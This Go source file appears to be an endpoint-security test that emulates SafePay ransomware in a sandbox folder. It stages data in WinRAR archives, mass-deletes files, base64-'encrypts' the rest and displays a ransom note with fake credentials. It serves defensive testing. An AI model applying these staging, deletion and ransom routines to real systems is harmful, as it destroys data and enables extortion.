//go:build windows
// +build windows

/*
ID: 6717c98c-b3db-490e-b03c-7b3bd3fb02ee
NAME: SafePay Go-Native Ransomware Simulation
TECHNIQUE: T1486, T1560.001, T1071.001, T1490, T1083, T1005
UNIT: response
CREATED: 2025-01-09
*/
package main

import (
	_ "embed"
	"encoding/base64"
	"fmt"
	"math"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

//go:embed WinRAR.exe
var winrarBinary []byte

// Global simulation state
type SimulationState struct {
	LogFile       string
	StartTime     time.Time
	TargetDir     string
	FilesCreated  int
	FilesDeleted  int
	FilesEncrypted int
	ArchivesCreated int
}

var simState *SimulationState

// Initialize simulation state
func initializeSimulation() {
	simState = &SimulationState{
		LogFile:   "C:\\F0\\safepay_simulation.log",
		StartTime: time.Now(),
		TargetDir: "C:\\Users\\fortika-test",
	}
	
	// Create target directory
	os.MkdirAll(simState.TargetDir, 0755)
	
	// Initialize log file
	logEntry := fmt.Sprintf("[%s] [INFO] SafePay Go-Native Ransomware Simulation Started\n", 
		time.Now().Format("2006-01-02 15:04:05.000"))
	os.WriteFile(simState.LogFile, []byte(logEntry), 0644)
}

// Logging function
func logMessage(level, message string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05.000")
	logEntry := fmt.Sprintf("[%s] [%s] %s\n", timestamp, level, message)
	
	// Write to log file
	file, err := os.OpenFile(simState.LogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		file.WriteString(logEntry)
		file.Close()
	}
	
	// Display to console with appropriate prefix
	prefix := "[*]"
	switch level {
	case "SUCCESS":
		prefix = "[+]"
	case "WARNING", "ERROR":
		prefix = "[!]"
	case "PHASE":
		prefix = "[PHASE]"
	}
	
	Endpoint.Say("%s %s", prefix, message)
}

// Check administrator privileges
func checkAdminPrivileges() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	isAdmin := err == nil
	
	if isAdmin {
		logMessage("SUCCESS", "Administrator privileges detected")
	} else {
		logMessage("WARNING", "Running without administrator privileges")
	}
	
	return isAdmin
}

// Check available disk space
func checkDiskSpace(minGB float64) bool {
	cmd := exec.Command("powershell", "-Command", 
		"(Get-WmiObject -Class Win32_LogicalDisk -Filter \"DeviceID='C:'\").FreeSpace/1GB")
	output, err := cmd.Output()
	if err != nil {
		logMessage("ERROR", "Failed to check disk space")
		return false
	}
	
	freeSpaceStr := strings.TrimSpace(string(output))
	freeSpace, err := strconv.ParseFloat(freeSpaceStr, 64)
	if err != nil {
		logMessage("ERROR", "Failed to parse disk space")
		return false
	}
	
	logMessage("INFO", fmt.Sprintf("Available disk space: %.2fGB", freeSpace))
	
	if freeSpace >= minGB {
		logMessage("SUCCESS", fmt.Sprintf("Disk space check passed (minimum %.1fGB required)", minGB))
		return true
	} else {
		logMessage("ERROR", fmt.Sprintf("Insufficient disk space (minimum %.1fGB required)", minGB))
		return false
	}
}

// Create corporate directory structure
func createCorporateDirectoryStructure() error {
	logMessage("PHASE", "============================================")
	logMessage("PHASE", "DIRECTORY STRUCTURE CREATION - STARTED")
	logMessage("PHASE", "============================================")
	
	directories := []string{
		"Documents\\Finance\\Reports\\Q1_2024",
		"Documents\\Finance\\Reports\\Q2_2024",
		"Documents\\Finance\\Budgets\\2024",
		"Documents\\Finance\\Audits\\Internal",
		"Documents\\HR\\Employees\\Active",
		"Documents\\HR\\Employees\\Terminated",
		"Documents\\HR\\Payroll\\2024",
		"Documents\\Legal\\Contracts\\Active",
		"Documents\\Legal\\Contracts\\Archive",
		"Documents\\Legal\\Compliance",
		"Documents\\IT\\Backups\\Database",
		"Documents\\IT\\Backups\\System",
		"Documents\\IT\\Credentials",
		"Desktop\\Sales\\Leads\\2024",
		"Desktop\\Sales\\Customers\\Active",
		"Desktop\\Sales\\Proposals",
		"Desktop\\Executive\\Board",
		"Desktop\\Executive\\Strategy",
		"Pictures\\Corporate",
	}
	
	createdCount := 0
	failedCount := 0
	
	for _, dir := range directories {
		fullPath := filepath.Join(simState.TargetDir, dir)
		err := os.MkdirAll(fullPath, 0755)
		if err != nil {
			logMessage("ERROR", fmt.Sprintf("Failed to create directory %s: %v", dir, err))
			failedCount++
		} else {
			logMessage("SUCCESS", fmt.Sprintf("Created directory: %s", dir))
			createdCount++
		}
	}
	
	logMessage("INFO", fmt.Sprintf("Directory creation complete - Created: %d, Failed: %d", createdCount, failedCount))
	logMessage("PHASE", "DIRECTORY STRUCTURE CREATION - COMPLETED")
	
	return nil
}

// Generate realistic content based on department
func generateRealisticContent(department, extension string, sizeKB int) string {
	baseContent := ""
	targetSize := sizeKB * 1024
	
	switch department {
	case "Finance":
		baseContent = fmt.Sprintf(`FINANCIAL REPORT - CONFIDENTIAL
Date: %s
Department: Finance Division

REVENUE ANALYSIS Q4 2024:
Product Line A: $2,450,000 (15%% increase YoY)
Product Line B: $1,890,000 (8%% increase YoY) 
Product Line C: $3,200,000 (22%% increase YoY)
International Sales: $1,100,000 (5%% decrease YoY)

EXPENSE BREAKDOWN:
Personnel Costs: $1,850,000
Operations: $890,000
Marketing: $450,000
R&D Investment: $780,000
Legal & Compliance: $120,000

NET PROFIT MARGIN: 23.5%%
EBITDA: $2,100,000

CONFIDENTIAL FINANCIAL METRICS:
Cash Flow Projection: $850K monthly
Debt-to-Equity Ratio: 0.45
Working Capital: $3.2M
`, time.Now().Format("2006-01-02"))

	case "HR":
		baseContent = fmt.Sprintf(`HUMAN RESOURCES DATABASE - RESTRICTED ACCESS
Generated: %s

EMPLOYEE RECORDS SUMMARY:
Total Active Employees: 847
New Hires Q4 2024: 23
Terminations Q4 2024: 8
Average Tenure: 4.2 years

SALARY INFORMATION:
Department,Average Salary,Bonus Pool,Stock Options
Engineering,$125000,$25000,5000
Sales,$95000,$45000,2500
Marketing,$85000,$15000,1500
Finance,$110000,$20000,2000
Legal,$140000,$30000,1000
Executive,$275000,$150000,25000

SENSITIVE HR DATA:
SSN Database Location: \\\\hr-server\\secure\\ssn_master.xlsx
Background Check Results: \\\\hr-server\\bg_checks\\2024\\
Performance Reviews: \\\\hr-server\\reviews\\annual_2024\\
Disciplinary Actions: 12 active cases
Workers Comp Claims: 3 pending
`, time.Now().Format("2006-01-02 15:04:05"))

	case "Legal":
		baseContent = fmt.Sprintf(`LEGAL DEPARTMENT - ATTORNEY-CLIENT PRIVILEGE
Document Control #: LC-2024-%04d
Classification: HIGHLY CONFIDENTIAL

ACTIVE LITIGATION SUMMARY:
Case #2024-001: Patent Infringement vs. TechCorp Inc.
  Status: Discovery Phase
  Potential Exposure: $15M
  Lead Attorney: Sarah Johnson, Esq.
  
Case #2024-002: Employment Discrimination Class Action  
  Status: Settlement Negotiations
  Potential Exposure: $8.5M
  Lead Attorney: Michael Chen, Esq.

INTELLECTUAL PROPERTY PORTFOLIO:
Active Patents: 127
Pending Applications: 23
Trademarks Registered: 45
Trade Secrets Documentation: Vault Server \\\\legal\\ts_vault\\

CONFIDENTIAL MATTERS:
M&A Due Diligence: Project Phoenix (Target: CompetitorY)
Potential Acquisition Cost: $250M
Due Date: March 2025
`, rand.Intn(9000)+1000)

	case "IT":
		baseContent = fmt.Sprintf(`IT SYSTEMS ADMINISTRATION - INTERNAL USE ONLY
System Status Report: %s
Security Classification: CONFIDENTIAL

INFRASTRUCTURE OVERVIEW:
Physical Servers: 45 active
Virtual Machines: 234 deployed
Cloud Instances: 67 (AWS), 23 (Azure)
Network Devices: 89 switches, 12 routers
Storage Capacity: 850TB total, 67%% utilized

CRITICAL SYSTEM CREDENTIALS:
Domain Admin: admin@corp.local / TempPass123!
SQL Server SA: sa / DatabaseSecure2024#
Oracle DBA: oracle_admin / OracleDB!2024
VMware vCenter: vcenter-admin / VMware@2024
AWS Root: aws-root@corp.com / AWSSecure2024!
Backup System: backup-svc / BackupPass789#

DATABASE SERVERS:
PROD-SQL-01: Customer Database (847,000 records)
PROD-SQL-02: Financial Database (RESTRICTED)  
PROD-SQL-03: HR Database (Employee PII)
DEV-SQL-01: Development Environment
DR-SQL-01: Disaster Recovery Site

SECURITY INCIDENTS Q4 2024:
Failed Login Attempts: 12,547
Malware Detections: 23 (all quarantined)
Phishing Attempts: 156 blocked
Data Exfiltration Attempts: 2 (under investigation)
`, time.Now().Format("2006-01-02 15:04:05"))

	case "Sales":
		baseContent = fmt.Sprintf(`SALES DEPARTMENT - CONFIDENTIAL CUSTOMER DATA
Report Generated: %s
Access Level: Sales Management Only

Q4 2024 SALES PERFORMANCE:
Total Revenue: $12,450,000
New Customer Acquisitions: 156
Customer Retention Rate: 94.2%%
Average Deal Size: $78,500
Sales Cycle Average: 89 days

TOP CUSTOMERS (CONFIDENTIAL):
MegaCorp Industries: $2.1M annual contract
Global Solutions Ltd: $1.8M annual contract  
TechGiant Inc: $1.5M annual contract
Enterprise Systems: $1.2M annual contract
Innovation Partners: $950K annual contract

CUSTOMER DATABASE EXCERPT:
Customer ID,Company,Contact,Phone,Email,Contract Value
CUS-001,Fortune500Corp,John Smith,555-0123,j.smith@f500.com,$2100000
CUS-002,TechStartup LLC,Jane Doe,555-0456,jane@startup.com,$450000
CUS-003,GlobalManuf Inc,Bob Johnson,555-0789,bob@global.com,$1800000

CRM SYSTEM ACCESS:
Salesforce.com Production: salesforce.corp.com
API Keys: sk_live_abc123xyz789
Integration Credentials: sfdc_api / SFDCpass2024!
`, time.Now().Format("2006-01-02 15:04:05"))

	case "Executive":
		baseContent = fmt.Sprintf(`EXECUTIVE BOARD MATERIALS - BOARD EYES ONLY
Board Meeting Date: %s  
Classification: TOP SECRET - BOARD CONFIDENTIAL

STRATEGIC INITIATIVES 2025:
1. ACQUISITION STRATEGY - PROJECT PHOENIX
   Target: CompetitorY Technologies
   Valuation: $450M - $650M range
   Strategic Rationale: Market consolidation + IP portfolio
   Timeline: Letter of Intent Q1 2025

2. NEW PRODUCT LAUNCH - PROJECT TITAN  
   Investment Required: $75M over 18 months
   Market Opportunity: $2.8B addressable market
   Competitive Advantage: AI-driven automation
   Expected ROI: 340%% over 5 years

EXECUTIVE COMPENSATION 2025:
CEO Base Salary: $850,000 (+7%% from 2024)
CEO Performance Bonus: Up to $1.2M (based on EBITDA)
CEO Equity Grant: 75,000 stock options
CFO Total Package: $650K base + equity
CTO Retention Package: $1.1M (counter-offer to Meta)

MATERIAL NON-PUBLIC INFORMATION:
- Patent approval expected Q2 2025 (breakthrough technology)
- Government contract award pending ($45M value)
- Strategic partnership with Fortune 10 company (under NDA)
- Potential IPO preparation timeline: 18-24 months

RISK FACTORS:
Regulatory changes in key markets
Supply chain disruption potential  
Key personnel retention challenges
Competitive pressure intensifying
`, time.Now().Format("2006-01-02"))

	default:
		baseContent = fmt.Sprintf(`CORPORATE DOCUMENT - INTERNAL USE
Generated: %s
Department: General
Classification: Internal

This document contains proprietary and confidential information
belonging to the company. Unauthorized distribution is prohibited.

Document Contents:
- Business processes and procedures
- Internal communications and memoranda  
- Strategic planning documents
- Operational data and metrics
- Customer and vendor information
- Financial and accounting records

For questions regarding this document, contact:
Document Control Office
Phone: (555) 123-4567
Email: doccontrol@company.com

CONFIDENTIAL - DO NOT DISTRIBUTE
`, time.Now().Format("2006-01-02 15:04:05"))
	}
	
	// Pad content to reach target size
	for len(baseContent) < targetSize {
		padding := fmt.Sprintf(`


ADDITIONAL CONFIDENTIAL DATA - PADDING
========================================
Transaction ID: %06d
Timestamp: %s
Data Classification: Confidential
Access Level: Authorized Personnel Only

This section contains additional proprietary information
that is critical to business operations and must be
protected according to company data classification policies.

Business Critical Information:
- Strategic planning data
- Competitive intelligence  
- Customer relationship details
- Financial performance metrics
- Operational procedures
- Technical specifications
- Personnel information
- Vendor agreements
- Regulatory compliance data
- Intellectual property details

`, rand.Intn(900000)+100000, time.Now().Format("2006-01-02 15:04:05.000"))
		baseContent += padding
	}
	
	// Trim to exact size if needed
	if len(baseContent) > targetSize {
		baseContent = baseContent[:targetSize]
	}
	
	return baseContent
}

// Create realistic corporate files
func createRealisticCorporateFiles(filesPerDir, minSizeKB, maxSizeKB int) error {
	logMessage("PHASE", "============================================")
	logMessage("PHASE", "FILE GENERATION - STARTED")
	logMessage("PHASE", "============================================")
	
	extensions := []string{".docx", ".xlsx", ".pdf", ".txt", ".csv", ".sql", ".bak", ".ppt", ".doc", ".zip"}
	departments := []string{"Finance", "HR", "Legal", "IT", "Sales", "Executive"}
	docTypes := []string{"Report", "Analysis", "Proposal", "Database", "Backup", "Contract", "Memo", "Presentation", "Spreadsheet", "Archive"}
	
	maxFiles := 1000
	totalFiles := 0
	
	logMessage("INFO", fmt.Sprintf("Generating realistic corporate files in: %s", simState.TargetDir))
	logMessage("INFO", fmt.Sprintf("Parameters: FilesPerDirectory=%d, SizeRange=%dKB-%dKB", filesPerDir, minSizeKB, maxSizeKB))
	
	// Walk through all directories
	err := filepath.Walk(simState.TargetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || !info.IsDir() || totalFiles >= maxFiles {
			return nil
		}
		
		// Determine department from path
		dept := "General"
		for _, d := range departments {
			if strings.Contains(path, d) {
				dept = d
				break
			}
		}
		
		// Calculate files to create in this directory
		filesToCreate := filesPerDir
		if totalFiles+filesToCreate > maxFiles {
			filesToCreate = maxFiles - totalFiles
		}
		
		for i := 0; i < filesToCreate; i++ {
			extension := extensions[rand.Intn(len(extensions))]
			docType := docTypes[rand.Intn(len(docTypes))]
			date := time.Now().AddDate(0, 0, -rand.Intn(365)).Format("2006-01-02")
			version := fmt.Sprintf("v%d", rand.Intn(9)+1)
			
			fileName := fmt.Sprintf("%s_%s_%s_%s%s", dept, docType, date, version, extension)
			filePath := filepath.Join(path, fileName)
			
			sizeKB := rand.Intn(maxSizeKB-minSizeKB) + minSizeKB
			content := generateRealisticContent(dept, extension, sizeKB)
			
			err := os.WriteFile(filePath, []byte(content), 0644)
			if err != nil {
				logMessage("ERROR", fmt.Sprintf("Failed to create %s: %v", fileName, err))
			} else {
				totalFiles++
				
				if totalFiles%50 == 0 {
					logMessage("INFO", fmt.Sprintf("Created %d files...", totalFiles))
				}
			}
		}
		
		return nil
	})
	
	if err != nil {
		return err
	}
	
	simState.FilesCreated = totalFiles
	logMessage("SUCCESS", fmt.Sprintf("File generation complete. Total files created: %d", totalFiles))
	logMessage("INFO", fmt.Sprintf("Departments covered: %s", strings.Join(departments, ", ")))
	logMessage("INFO", fmt.Sprintf("Extensions used: %s", strings.Join(extensions, ", ")))
	logMessage("PHASE", "FILE GENERATION - COMPLETED")
	
	return nil
}

// Execute multi-phase compression operations
func executeMultiPhaseCompression() error {
	logMessage("PHASE", "============================================")
	logMessage("PHASE", "MULTI-PHASE COMPRESSION - STARTED")
	logMessage("PHASE", "============================================")
	
	winrarPath := "C:\\F0\\WinRAR.exe"
	if _, err := os.Stat(winrarPath); os.IsNotExist(err) {
		logMessage("ERROR", fmt.Sprintf("WinRAR not found at: %s", winrarPath))
		return err
	}
	
	departments := []string{"Finance", "HR", "Legal", "IT", "Sales", "Executive"}
	
	// Phase 1: Department-level archives
	logMessage("INFO", "Phase 1: Creating department-level archives")
	for _, dept := range departments {
		deptPath := ""
		filepath.Walk(simState.TargetDir, func(path string, info os.FileInfo, err error) error {
			if err == nil && info.IsDir() && strings.Contains(path, dept) && deptPath == "" {
				deptPath = path
				return filepath.SkipDir
			}
			return nil
		})
		
		if deptPath != "" {
			archiveName := fmt.Sprintf("%s_Archive_%s.rar", dept, time.Now().Format("20060102"))
			archivePath := filepath.Join(simState.TargetDir, archiveName)
			
			args := []string{
				"a",           // Add to archive
				"-r",          // Recurse subdirectories
				"-m3",         // Good compression
				"-mt2",        // Use 2 threads
				"-ep1",        // Exclude base folder
				archivePath,
				filepath.Join(deptPath, "*"),
			}
			
			logMessage("INFO", fmt.Sprintf("Archiving %s department to: %s", dept, archiveName))
			cmd := exec.Command(winrarPath, args...)
			err := cmd.Run()
			if err != nil {
				logMessage("ERROR", fmt.Sprintf("%s archive failed: %v", dept, err))
			} else {
				logMessage("SUCCESS", fmt.Sprintf("%s archive created successfully: %s", dept, archivePath))
				simState.ArchivesCreated++
			}
			
			time.Sleep(1 * time.Second)
		}
	}
	
	// Phase 2: Location-based archives
	logMessage("INFO", "Phase 2: Creating location-based archives")
	locations := []string{"Documents", "Desktop", "Pictures"}
	
	for _, location := range locations {
		locationPath := filepath.Join(simState.TargetDir, location)
		if _, err := os.Stat(locationPath); err == nil {
			archiveName := fmt.Sprintf("%s_Data_%s.rar", location, time.Now().Format("20060102_1504"))
			archivePath := filepath.Join(simState.TargetDir, archiveName)
			
			args := []string{
				"a",
				"-r",
				"-m3",
				"-mt2",
				archivePath,
				filepath.Join(locationPath, "*"),
			}
			
			logMessage("INFO", fmt.Sprintf("Creating archive for %s", location))
			cmd := exec.Command(winrarPath, args...)
			err := cmd.Run()
			if err != nil {
				logMessage("ERROR", fmt.Sprintf("%s compression failed: %v", location, err))
			} else {
				logMessage("SUCCESS", fmt.Sprintf("%s compression completed successfully", location))
				simState.ArchivesCreated++
			}
		}
	}
	
	// Phase 3: Master exfiltration archive
	logMessage("INFO", "Phase 3: Creating master exfiltration archive")
	masterArchiveName := fmt.Sprintf("EXFIL_Master_%s.rar", time.Now().Format("20060102_1504"))
	masterArchivePath := filepath.Join(simState.TargetDir, masterArchiveName)
	
	masterArgs := []string{
		"a",
		"-r",
		"-m1",                    // Fast compression
		"-ed",                    // Do not add empty directories
		"-x*.rar",                // Exclude existing RAR files
		masterArchivePath,
		filepath.Join(simState.TargetDir, "*"),
	}
	
	logMessage("INFO", fmt.Sprintf("Creating master exfiltration archive: %s", masterArchiveName))
	cmd := exec.Command(winrarPath, masterArgs...)
	err := cmd.Run()
	if err != nil {
		logMessage("ERROR", fmt.Sprintf("Master archive creation failed: %v", err))
	} else {
		logMessage("SUCCESS", "Master exfiltration archive created successfully")
		simState.ArchivesCreated++
	}
	
	logMessage("PHASE", "MULTI-PHASE COMPRESSION - COMPLETED")
	return nil
}

// Perform selective deletion of files
func performSelectiveDeletion(deletionPercentage float64) error {
	logMessage("PHASE", "============================================")
	logMessage("PHASE", "SELECTIVE MASS DELETION - STARTED")
	logMessage("PHASE", "============================================")
	
	excludePatterns := []string{"*.rar", "*.safepay", "readme_safepay.txt", "*.log"}
	extensions := []string{"*.docx", "*.xlsx", "*.pdf", "*.txt", "*.csv", "*.sql", "*.bak", "*.ppt", "*.doc", "*.zip"}
	
	logMessage("WARNING", fmt.Sprintf("Starting selective deletion of original files (%.0f%% deletion rate)", deletionPercentage*100))
	
	// Collect all files
	var allFiles []string
	for _, ext := range extensions {
		filepath.Walk(simState.TargetDir, func(path string, info os.FileInfo, err error) error {
			if err == nil && !info.IsDir() {
				matched, _ := filepath.Match(ext, info.Name())
				if matched {
					// Check if file should be excluded
					exclude := false
					for _, pattern := range excludePatterns {
						if matched, _ := filepath.Match(pattern, info.Name()); matched {
							exclude = true
							break
						}
					}
					if !exclude {
						allFiles = append(allFiles, path)
					}
				}
			}
			return nil
		})
	}
	
	// Calculate deletion counts
	totalFiles := len(allFiles)
	filesToDelete := int(math.Floor(float64(totalFiles) * deletionPercentage))
	filesToPreserve := totalFiles - filesToDelete
	
	logMessage("INFO", fmt.Sprintf("Found %d files total", totalFiles))
	logMessage("INFO", fmt.Sprintf("Will delete %d files (%.0f%%)", filesToDelete, deletionPercentage*100))
	logMessage("INFO", fmt.Sprintf("Will preserve %d files for encryption", filesToPreserve))
	
	// Randomly select files to delete
	rand.Shuffle(len(allFiles), func(i, j int) {
		allFiles[i], allFiles[j] = allFiles[j], allFiles[i]
	})
	
	// Delete files in batches
	batchSize := 50
	deletedCount := 0
	
	for i := 0; i < filesToDelete && i < len(allFiles); i += batchSize {
		endIdx := i + batchSize
		if endIdx > filesToDelete {
			endIdx = filesToDelete
		}
		if endIdx > len(allFiles) {
			endIdx = len(allFiles)
		}
		
		logMessage("INFO", fmt.Sprintf("Secure deletion batch %d (files %d-%d)", (i/batchSize)+1, i+1, endIdx))
		
		for j := i; j < endIdx; j++ {
			err := os.Remove(allFiles[j])
			if err != nil {
				logMessage("ERROR", fmt.Sprintf("Failed to delete %s: %v", filepath.Base(allFiles[j]), err))
			} else {
				deletedCount++
				if deletedCount%25 == 0 {
					logMessage("INFO", fmt.Sprintf("Deleted %d files...", deletedCount))
				}
			}
		}
		
		time.Sleep(1 * time.Second)
	}
	
	simState.FilesDeleted = deletedCount
	logMessage("INFO", fmt.Sprintf("Selective mass deletion complete - Files deleted: %d", deletedCount))
	
	// Verify files remain for encryption
	var remainingFiles []string
	for _, ext := range extensions {
		filepath.Walk(simState.TargetDir, func(path string, info os.FileInfo, err error) error {
			if err == nil && !info.IsDir() {
				if matched, _ := filepath.Match(ext, info.Name()); matched {
					exclude := false
					for _, pattern := range excludePatterns {
						if matched, _ := filepath.Match(pattern, info.Name()); matched {
							exclude = true
							break
						}
					}
					if !exclude {
						remainingFiles = append(remainingFiles, path)
					}
				}
			}
			return nil
		})
	}
	
	logMessage("SUCCESS", fmt.Sprintf("Files remaining for encryption: %d", len(remainingFiles)))
	logMessage("PHASE", "SELECTIVE MASS DELETION - COMPLETED")
	
	return nil
}

// Simulate file encryption
func simulateFileEncryption() error {
	logMessage("PHASE", "============================================")
	logMessage("PHASE", "FILE ENCRYPTION - STARTED")
	logMessage("PHASE", "============================================")
	
	extensions := []string{"*.xlsx", "*.csv", "*.txt", "*.docx", "*.pdf", "*.sql", "*.bak", "*.ppt", "*.doc", "*.zip"}
	var filesToEncrypt []string
	
	// Collect files to encrypt
	for _, ext := range extensions {
		filepath.Walk(simState.TargetDir, func(path string, info os.FileInfo, err error) error {
			if err == nil && !info.IsDir() {
				if matched, _ := filepath.Match(ext, info.Name()); matched {
					filesToEncrypt = append(filesToEncrypt, path)
				}
			}
			return nil
		})
	}
	
	if len(filesToEncrypt) == 0 {
		logMessage("ERROR", "No files remaining for encryption! Check deletion logic.")
		return fmt.Errorf("no files for encryption")
	}
	
	logMessage("SUCCESS", fmt.Sprintf("Found %d files remaining for encryption", len(filesToEncrypt)))
	
	encryptedCount := 0
	failureCount := 0
	
	for _, filePath := range filesToEncrypt {
		encryptedName := filePath + ".safepay"
		logMessage("INFO", fmt.Sprintf("Encrypting file: %s", filepath.Base(filePath)))
		
		// Read original content
		originalContent, err := os.ReadFile(filePath)
		if err != nil {
			logMessage("ERROR", fmt.Sprintf("Failed to read %s: %v", filepath.Base(filePath), err))
			failureCount++
			continue
		}
		
		// Simulate encryption with Base64 encoding
		encryptedContent := base64.StdEncoding.EncodeToString(originalContent)
		
		// Write encrypted file
		err = os.WriteFile(encryptedName, []byte(encryptedContent), 0644)
		if err != nil {
			logMessage("ERROR", fmt.Sprintf("Failed to write encrypted %s: %v", filepath.Base(filePath), err))
			failureCount++
			continue
		}
		
		// Delete original file
		err = os.Remove(filePath)
		if err != nil {
			logMessage("WARNING", fmt.Sprintf("Failed to delete original %s: %v", filepath.Base(filePath), err))
		}
		
		encryptedCount++
		logMessage("SUCCESS", fmt.Sprintf("ENCRYPTED: %s -> %s.safepay", filepath.Base(filePath), filepath.Base(filePath)))
	}
	
	simState.FilesEncrypted = encryptedCount
	logMessage("SUCCESS", fmt.Sprintf("Encryption complete - Files encrypted: %d, Failed: %d", encryptedCount, failureCount))
	logMessage("PHASE", "FILE ENCRYPTION - COMPLETED")
	
	return nil
}

// Create ransom note
func createRansomNote() error {
	logMessage("PHASE", "============================================")
	logMessage("PHASE", "RANSOM NOTE CREATION - STARTED")
	logMessage("PHASE", "============================================")
	
	computerID := rand.Intn(900000) + 100000
	ransomNote := fmt.Sprintf(`=================================================================================
                           SAFEPAY RANSOMWARE
=================================================================================

All your files have been encrypted!

Your files have been encrypted with military-grade encryption and a unique key
generated for this computer. Private decryption key is stored on our secret
server and nobody can decrypt your files without paying for the key.

WHAT HAPPENED?
--------------
Your important files are encrypted. Many of your documents, photos, videos,
databases and other files are no longer accessible because they have been
encrypted. Maybe you are busy looking for a way to recover your files, but
do not waste your time. Nobody can recover your files without our decryption
service.

HOW TO RECOVER FILES?
--------------------
To recover your files, you need to pay 0.5 Bitcoin to the following address:
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

After payment, send your Computer ID to: safepay@darkweb.onion

Your Computer ID: %d

WARNINGS!
---------
- Do not try to decrypt files yourself
- Do not contact data recovery companies
- Do not reinstall Windows
- Your files will be permanently lost if you don't follow instructions

You have 72 hours to make the payment.

=================================================================================
`, computerID)
	
	ransomNotePath := filepath.Join(simState.TargetDir, "readme_safepay.txt")
	err := os.WriteFile(ransomNotePath, []byte(ransomNote), 0644)
	if err != nil {
		logMessage("ERROR", fmt.Sprintf("Failed to create ransom note: %v", err))
		return err
	}
	
	logMessage("SUCCESS", fmt.Sprintf("Ransom note created: %s", ransomNotePath))
	
	// Open ransom note in notepad
	cmd := exec.Command("notepad.exe", ransomNotePath)
	err = cmd.Start()
	if err != nil {
		logMessage("WARNING", "Failed to display ransom note")
	} else {
		logMessage("SUCCESS", "Displayed ransom note to user")
	}
	
	logMessage("PHASE", "RANSOM NOTE CREATION - COMPLETED")
	return nil
}

// Simulate C2 communication
func simulateC2Communication() {
	logMessage("PHASE", "============================================")
	logMessage("PHASE", "C2 COMMUNICATION SIMULATION - STARTED")
	logMessage("PHASE", "============================================")
	
	logMessage("INFO", "Simulating C2 communication")
	logMessage("INFO", "Sending header pattern: C4 C3 C2 C1")
	logMessage("INFO", "Establishing connection to C2 server")
	logMessage("INFO", "Encryption key sent to attacker server")
	
	logMessage("PHASE", "C2 COMMUNICATION SIMULATION - COMPLETED")
}

// Main test execution
func executeGoNativeRansomwareSimulation() error {
	// Initialize simulation
	initializeSimulation()
	
	// Check prerequisites
	checkAdminPrivileges()
	
	if !checkDiskSpace(2.0) {
		return fmt.Errorf("insufficient disk space")
	}
	
	// Drop WinRAR binary
	winrarPath := "C:\\F0\\WinRAR.exe"
	err := os.WriteFile(winrarPath, winrarBinary, 0755)
	if err != nil {
		return fmt.Errorf("failed to drop WinRAR: %v", err)
	}
	logMessage("SUCCESS", "WinRAR.exe dropped to C:\\F0")
	
	// Phase 1: Create directory structure
	err = createCorporateDirectoryStructure()
	if err != nil {
		return fmt.Errorf("directory creation failed: %v", err)
	}
	
	// Phase 2: Generate files
	err = createRealisticCorporateFiles(20, 5, 10)
	if err != nil {
		return fmt.Errorf("file generation failed: %v", err)
	}
	
	// Brief pause
	logMessage("INFO", "Pausing for 3 seconds to allow file system to settle...")
	time.Sleep(3 * time.Second)
	
	// Phase 3: Compression operations
	err = executeMultiPhaseCompression()
	if err != nil {
		logMessage("WARNING", fmt.Sprintf("Compression encountered errors: %v", err))
	}
	
	// Phase 4: Selective deletion
	time.Sleep(2 * time.Second)
	err = performSelectiveDeletion(0.65)
	if err != nil {
		return fmt.Errorf("selective deletion failed: %v", err)
	}
	
	// Phase 5: File encryption
	err = simulateFileEncryption()
	if err != nil {
		return fmt.Errorf("encryption failed: %v", err)
	}
	
	// Phase 6: Create ransom note
	err = createRansomNote()
	if err != nil {
		return fmt.Errorf("ransom note creation failed: %v", err)
	}
	
	// Phase 7: Simulate C2 communication
	simulateC2Communication()
	
	return nil
}

func test() {
	// Initialize the dropper
	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		Endpoint.Say("Dropper initialization failed: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	Endpoint.Say("Starting SafePay Go-Native Ransomware Simulation")
	Endpoint.Say("This test implements all ransomware behaviors directly in Go")
	Endpoint.Say("Expected behaviors: Mass file creation, compression, deletion, encryption")
	Endpoint.Say("Target: C:\\Users\\fortika-test (realistic user directory)")
	Endpoint.Say("Checking for initial defensive reaction")
	Endpoint.Wait(2)

	// Check if WinRAR gets quarantined
	if Endpoint.Quarantined("WinRAR.exe", winrarBinary) {
		Endpoint.Say("WinRAR binary was caught!")
		Endpoint.Stop(Endpoint.FileQuarantinedOnExtraction)
	}

	Endpoint.Say("WinRAR binary was not caught, executing Go-native ransomware simulation")

	// Execute the complete simulation
	err := executeGoNativeRansomwareSimulation()
	if err != nil {
		Endpoint.Say("Simulation execution error: %v", err)
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}

	// Display final statistics
	executionTime := time.Since(simState.StartTime)
	
	logMessage("SUCCESS", "=================================================================================")
	logMessage("SUCCESS", "ATTACK SUMMARY - GO-NATIVE IMPLEMENTATION")
	logMessage("SUCCESS", "=================================================================================")
	logMessage("SUCCESS", fmt.Sprintf("Files Created: %d", simState.FilesCreated))
	logMessage("SUCCESS", fmt.Sprintf("Files Deleted: %d", simState.FilesDeleted))
	logMessage("SUCCESS", fmt.Sprintf("Files Encrypted (.safepay): %d", simState.FilesEncrypted))
	logMessage("SUCCESS", fmt.Sprintf("Archive Files Created: %d", simState.ArchivesCreated))
	logMessage("SUCCESS", fmt.Sprintf("Target Location: %s", simState.TargetDir))
	logMessage("SUCCESS", fmt.Sprintf("Execution Time: %.2f minutes", executionTime.Minutes()))
	
	// Verify .safepay files
	var safepayFiles []string
	filepath.Walk(simState.TargetDir, func(path string, info os.FileInfo, err error) error {
		if err == nil && strings.HasSuffix(info.Name(), ".safepay") {
			safepayFiles = append(safepayFiles, path)
		}
		return nil
	})
	
	if len(safepayFiles) > 0 {
		logMessage("SUCCESS", fmt.Sprintf("Created %d .safepay extension files:", len(safepayFiles)))
		for i, file := range safepayFiles {
			if i < 5 {
				logMessage("SUCCESS", fmt.Sprintf("  - %s", file))
			}
		}
		if len(safepayFiles) > 5 {
